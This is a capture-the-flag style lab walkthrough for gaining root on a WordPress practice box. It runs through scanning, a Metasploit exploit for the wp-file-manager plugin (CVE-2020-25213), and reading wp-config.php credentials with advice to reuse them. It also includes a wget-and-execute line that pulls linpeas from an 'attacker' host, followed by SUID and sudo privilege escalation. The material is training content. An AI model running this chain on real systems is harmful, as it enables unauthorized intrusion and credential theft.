# Scenario 04 — WordPress Plugin RCE to Root

**Difficulty:** 🔴 | **Time:** ~35 min | **Domains:** 02 Scanning, 12 Web Apps, 05 System Hacking
**Tools:** [nmap](../../tools/nmap.md), [wpscan](../../tools/wpscan.md), [metasploit](../../tools/metasploit.md), `linpeas`

## Story
Target `10.10.10.33` runs WordPress. Retrieve `/root/root.txt`.

## Step 1 — Scan
```bash
nmap -sV -p- -T4 10.10.10.33
```
**Expected finding:** 22/ssh, 80/http WordPress.
**→ Tool ref:** [nmap](../../tools/nmap.md#scan-techniques)

## Step 2 — WP enum
```bash
wpscan --url http://10.10.10.33 --enumerate vp,u,ap --api-token <TOKEN>
```
**Expected finding:** plugin `wp-file-manager` 6.0 (CVE-2020-25213), user `admin`.
**→ Tool ref:** [wpscan](../../tools/wpscan.md)

## Step 3 — Exploit the plugin (RCE)
```bash
msfconsole -q
use exploit/unix/webapp/wp_file_manager_code_exec
set RHOSTS 10.10.10.33
set LHOST tun0
exploit
```
**Expected finding:** meterpreter as `www-data`.
**→ Tool ref:** [metasploit](../../tools/metasploit.md)

## Step 4 — Read wp-config.php
```bash
cat /var/www/html/wp-config.php | grep -E 'DB_|AUTH'
```
**Expected finding:** DB creds; try reuse on local users (`su` to whatever matches).

## Step 5 — Privesc enum
```bash
wget http://attacker/linpeas.sh -O /tmp/l.sh && chmod +x /tmp/l.sh && /tmp/l.sh
```
**Expected finding:** a SUID binary, writable /etc/passwd, or sudo NOPASSWD entry.

## Step 6 — Root it
Typical wins:
```bash
# SUID find
find / -perm -4000 -type f 2>/dev/null
# sudo
sudo -l
sudo /usr/bin/whatever
```
**Expected finding:** root shell.

## Step 7 — Final answer
```bash
cat /root/root.txt
```
**Answer format:** flag string.

## Gotchas across this chain
- wpscan needs an API token for vulnerability data — without it you only get version numbers.
- If msf module fails, Exploit-DB has a raw PoC curl one-liner for wp-file-manager.
- `www-data` almost never has `sudo -l` output — focus on SUID + cron + kernel.
- wp-config creds are usually **DB-only** — reuse them against MySQL locally, not SSH.
- linpeas output is huge — grep for `95%`, `90%` confidence hits.

## Variant questions this scenario teaches you to handle
- "What WordPress version is running?" → step 2.
- "Name a vulnerable plugin on the target" → step 2.
- "What DB password does WordPress use?" → steps 3–4.
- "Get root on the box" → full chain.
